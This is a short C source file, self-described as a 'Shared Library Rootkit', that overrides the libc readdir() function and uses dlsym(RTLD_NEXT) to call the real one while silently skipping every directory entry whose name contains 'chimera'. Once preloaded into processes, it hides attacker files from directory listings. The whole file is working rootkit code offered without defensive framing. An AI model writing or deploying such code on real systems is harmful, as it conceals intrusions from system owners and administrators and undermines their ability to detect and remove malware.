#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>

/* Agent 426: Shared Library Rootkit.
   Hooks the readdir() function to hide files 
   containing the string "chimera" from the user.
*/

struct dirent *readdir(DIR *dirp) {
    // 1. Get the original readdir function pointer using dlsym
    struct dirent *(*original_readdir)(DIR *);
    original_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;

    // 2. Call the original function and filter results
    while ((entry = original_readdir(dirp)) != NULL) {
        // If the filename contains "chimera", skip it and get the next one
        if (strstr(entry->d_name, "chimera") == NULL) {
            return entry;
        }
    }

    return NULL;
}
